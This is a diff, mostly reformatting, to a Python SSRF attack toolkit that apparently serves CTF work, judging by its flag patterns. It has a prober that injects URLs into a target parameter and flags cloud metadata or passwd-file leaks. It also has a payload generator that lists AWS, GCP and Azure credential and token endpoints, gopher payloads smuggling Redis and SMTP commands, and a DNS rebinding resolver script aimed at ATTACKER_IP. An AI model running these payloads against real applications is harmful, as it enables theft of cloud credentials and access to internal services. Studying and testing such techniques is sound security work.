@@ -6,9 +6,8 @@ Provides utilities for detecting SSRF vulnerabilities and generating bypass payl
 
 import json
 import re
-import struct
-import socket
-from typing import Dict, List, Optional, Tuple
+from typing import Optional, Tuple
+
 import requests
 
 
@@ -47,9 +46,15 @@ class SsrfProbeTool:
     # Cloud metadata endpoint targets
     CLOUD_TARGETS = [
         ("http://169.254.169.254/latest/meta-data/", "AWS metadata"),
-        ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AWS IAM credentials"),
+        (
+            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+            "AWS IAM credentials",
+        ),
         ("http://metadata.google.internal/computeMetadata/v1/", "GCP metadata"),
-        ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "Azure metadata"),
+        (
+            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+            "Azure metadata",
+        ),
         ("http://169.254.169.254/metadata/v1/", "DigitalOcean metadata"),
     ]
 
@@ -74,19 +79,29 @@ class SsrfProbeTool:
 
     # Detection patterns for cloud metadata
     CLOUD_INDICATORS = [
-        "ami-id", "instance-id", "availability-zone", "iam",
-        "computeMetadata", "RUNNING",
+        "ami-id",
+        "instance-id",
+        "availability-zone",
+        "iam",
+        "computeMetadata",
+        "RUNNING",
     ]
 
     # Detection patterns for file content
     FILE_INDICATORS = [
-        "root:x:0:0:", "localhost", "DOCUMENT_ROOT",
+        "root:x:0:0:",
+        "localhost",
+        "DOCUMENT_ROOT",
     ]
 
     # Flag patterns
     FLAG_PATTERNS = [
-        r"flag\{[^}]+\}", r"FLAG\{[^}]+\}", r"CTF\{[^}]+\}",
-        r"ctf\{[^}]+\}", r"picoCTF\{[^}]+\}", r"HTB\{[^}]+\}",
+        r"flag\{[^}]+\}",
+        r"FLAG\{[^}]+\}",
+        r"CTF\{[^}]+\}",
+        r"ctf\{[^}]+\}",
+        r"picoCTF\{[^}]+\}",
+        r"HTB\{[^}]+\}",
     ]
 
     def __init__(self, session: Optional[requests.Session] = None):
@@ -111,7 +126,9 @@ class SsrfProbeTool:
         if not param:
             return "[SsrfProbeTool] Error: 'param' is required."
         if method not in ["GET", "POST"]:
-            return f"[SsrfProbeTool] Error: 'method' must be GET or POST, got '{method}'."
+            return (
+                f"[SsrfProbeTool] Error: 'method' must be GET or POST, got '{method}'."
+            )
 
         try:
             return self._probe_ssrf(url, param, method, extra_data, targets, timeout)
@@ -174,7 +191,9 @@ class SsrfProbeTool:
             baseline_text = baseline.text
             baseline_len = len(baseline_text)
             baseline_status = baseline.status_code
-            results.append(f"Baseline response: {baseline_status}, {baseline_len} bytes")
+            results.append(
+                f"Baseline response: {baseline_status}, {baseline_len} bytes"
+            )
         except Exception as e:
             return f"[SsrfProbeTool] Error: Could not get baseline response: {e}"
 
@@ -208,7 +227,9 @@ class SsrfProbeTool:
                 for indicator in self.CLOUD_INDICATORS:
                     if indicator in resp_text:
                         findings.append(f"cloud:{desc}")
-                        results.append(f"[+] SSRF DETECTED ({desc}): Found '{indicator}'")
+                        results.append(
+                            f"[+] SSRF DETECTED ({desc}): Found '{indicator}'"
+                        )
                         snippet = resp_text[:200].replace("\n", " ")
                         results.append(f"    Response snippet: {snippet}...")
                         break
@@ -217,7 +238,9 @@ class SsrfProbeTool:
                 for indicator in self.FILE_INDICATORS:
                     if indicator in resp_text:
                         findings.append(f"file:{desc}")
-                        results.append(f"[+] SSRF DETECTED ({desc}): Found '{indicator}'")
+                        results.append(
+                            f"[+] SSRF DETECTED ({desc}): Found '{indicator}'"
+                        )
                         snippet = resp_text[:200].replace("\n", " ")
                         results.append(f"    Response snippet: {snippet}...")
                         break
@@ -227,7 +250,10 @@ class SsrfProbeTool:
                     resp_len = len(resp_text)
                     if abs(resp_len - baseline_len) > 50:
                         # Check if response contains HTML or JSON data
-                        if any(marker in resp_text for marker in ["<html", "<HTML", "{", "<!DOCTYPE"]):
+                        if any(
+                            marker in resp_text
+                            for marker in ["<html", "<HTML", "{", "<!DOCTYPE"]
+                        ):
                             findings.append(f"internal:{desc}")
                             results.append(
                                 f"[+] SSRF DETECTED ({desc}): Response differs from baseline "
@@ -242,13 +268,17 @@ class SsrfProbeTool:
         # Summary
         results.append("=== Summary ===")
         if findings:
-            results.append(f"[!] SSRF VULNERABILITY DETECTED! ({len(findings)} finding(s))")
+            results.append(
+                f"[!] SSRF VULNERABILITY DETECTED! ({len(findings)} finding(s))"
+            )
             for finding in findings:
                 results.append(f"  - {finding}")
         else:
             results.append("[-] No obvious SSRF vulnerability detected")
             results.append("[*] Consider trying:")
-            results.append("    1. IP bypass techniques (use ssrf_payload_generator ip_bypass)")
+            results.append(
+                "    1. IP bypass techniques (use ssrf_payload_generator ip_bypass)"
+            )
             results.append("    2. Different parameters")
             results.append("    3. URL encoding")
             results.append("    4. Double URL encoding")
@@ -287,7 +317,12 @@ class SsrfPayloadGenerator:
         "paths for AWS/GCP/Azure/DigitalOcean. protocol_smuggling generates gopher/dict/tftp/ldap payloads."
     )
 
-    VALID_OPERATIONS = ["ip_bypass", "cloud_metadata", "protocol_smuggling", "dns_rebinding"]
+    VALID_OPERATIONS = [
+        "ip_bypass",
+        "cloud_metadata",
+        "protocol_smuggling",
+        "dns_rebinding",
+    ]
 
     def __init__(self):
         pass
@@ -435,10 +470,16 @@ class SsrfPayloadGenerator:
         result.append("http://169.254.169.254/latest/meta-data/")
         result.append("http://169.254.169.254/latest/meta-data/ami-id")
         result.append("http://169.254.169.254/latest/meta-data/hostname")
-        result.append("http://169.254.169.254/latest/meta-data/iam/security-credentials/")
-        result.append("http://169.254.169.254/latest/meta-data/iam/security-credentials/{role-name}")
+        result.append(
+            "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+        )
+        result.append(
+            "http://169.254.169.254/latest/meta-data/iam/security-credentials/{role-name}"
+        )
         result.append("http://169.254.169.254/latest/user-data")
-        result.append("http://169.254.169.254/latest/dynamic/instance-identity/document")
+        result.append(
+            "http://169.254.169.254/latest/dynamic/instance-identity/document"
+        )
         result.append("[*] No special headers required for IMDSv1")
         result.append("[*] IMDSv2 requires header: X-aws-ec2-metadata-token")
         result.append("")
@@ -446,19 +487,33 @@ class SsrfPayloadGenerator:
         # GCP
         result.append("=== GCP ===")
         result.append("http://metadata.google.internal/computeMetadata/v1/")
-        result.append("http://metadata.google.internal/computeMetadata/v1/project/project-id")
-        result.append("http://metadata.google.internal/computeMetadata/v1/instance/hostname")
-        result.append("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token")
-        result.append("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email")
+        result.append(
+            "http://metadata.google.internal/computeMetadata/v1/project/project-id"
+        )
+        result.append(
+            "http://metadata.google.internal/computeMetadata/v1/instance/hostname"
+        )
+        result.append(
+            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
+        )
+        result.append(
+            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email"
+        )
         result.append("[*] Required header: Metadata-Flavor: Google")
         result.append("")
 
         # Azure
         result.append("=== Azure ===")
         result.append("http://169.254.169.254/metadata/instance?api-version=2021-02-01")
-        result.append("http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01")
-        result.append("http://169.254.169.254/metadata/instance/network?api-version=2021-02-01")
-        result.append("http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/")
+        result.append(
+            "http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01"
+        )
+        result.append(
+            "http://169.254.169.254/metadata/instance/network?api-version=2021-02-01"
+        )
+        result.append(
+            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
+        )
         result.append("[*] Required header: Metadata: true")
         result.append("")
 
@@ -481,9 +536,13 @@ class SsrfPayloadGenerator:
 
         # Gopher
         result.append("=== gopher:// ===")
-        result.append(f"gopher://{target_ip}:{target_port}/_GET%20/%20HTTP/1.1%0d%0aHost:%20{target_ip}%0d%0a%0d%0a")
+        result.append(
+            f"gopher://{target_ip}:{target_port}/_GET%20/%20HTTP/1.1%0d%0aHost:%20{target_ip}%0d%0a%0d%0a"
+        )
         result.append(f"gopher://{target_ip}:6379/_SET%20payload%20%22test%22%0d%0a")
-        result.append(f"gopher://{target_ip}:25/_HELO%20localhost%0d%0aMAIL%20FROM:..%0d%0a")
+        result.append(
+            f"gopher://{target_ip}:25/_HELO%20localhost%0d%0aMAIL%20FROM:..%0d%0a"
+        )
         result.append("[*] gopher:// allows crafting raw TCP packets")
         result.append("[*] Use URL encoding for CR/LF: %0d%0a")
         result.append("[*] Prefix payload with _ (gopher requires it)")
@@ -522,10 +581,14 @@ class SsrfPayloadGenerator:
         result.append("")
 
         result.append("=== How DNS Rebinding Works ===")
-        result.append("1. Victim app resolves attacker domain -> gets attacker IP (passes allowlist)")
+        result.append(
+            "1. Victim app resolves attacker domain -> gets attacker IP (passes allowlist)"
+        )
         result.append("2. Attacker DNS server changes record to target internal IP")
         result.append("3. Victim app makes the actual request -> hits internal IP")
-        result.append("4. Bypasses IP-based allowlists since DNS check != connection IP")
+        result.append(
+            "4. Bypasses IP-based allowlists since DNS check != connection IP"
+        )
         result.append("")
 
         result.append("=== Public DNS Rebinding Services ===")
@@ -544,7 +607,9 @@ class SsrfPayloadGenerator:
         result.append("--- nip.io / sslip.io ---")
         result.append(f"http://{target_ip}.nip.io")
         result.append(f"http://{target_ip}.sslip.io")
-        result.append("[*] Always resolves to the embedded IP (useful for filter bypass)")
+        result.append(
+            "[*] Always resolves to the embedded IP (useful for filter bypass)"
+        )
         result.append("")
 
         result.append("--- ceye.io (OOB DNS) ---")
@@ -569,7 +634,9 @@ class SsrfPayloadGenerator:
         result.append("        reply = request.reply()")
         result.append("        ip = self.ips[self.counter % 2]")
         result.append("        self.counter += 1")
-        result.append("        reply.add_answer(RR(request.q.qname, QTYPE.A, rdata=A(ip), ttl=0))")
+        result.append(
+            "        reply.add_answer(RR(request.q.qname, QTYPE.A, rdata=A(ip), ttl=0))"
+        )
         result.append("        return reply")
         result.append("")
         result.append(f"resolver = RebindResolver('ATTACKER_IP', '{target_ip}')")
@@ -598,10 +665,16 @@ class SsrfPayloadGenerator:
         result.append("")
 
         result.append("=== Tips ===")
-        result.append("1. DNS rebinding bypasses allowlists that check resolved IP at request time")
+        result.append(
+            "1. DNS rebinding bypasses allowlists that check resolved IP at request time"
+        )
         result.append("2. Set TTL=0 in your DNS responses to prevent caching")
-        result.append("3. Some apps cache DNS results in-process (Java, Go) — harder to rebind")
+        result.append(
+            "3. Some apps cache DNS results in-process (Java, Go) — harder to rebind"
+        )
         result.append("4. Combine with race conditions for better success rate")
-        result.append(f"5. Target common internal services: {target_ip}:80, :8080, :3000, :5000")
+        result.append(
+            f"5. Target common internal services: {target_ip}:80, :8080, :3000, :5000"
+        )
 
         return "\n".join(result)
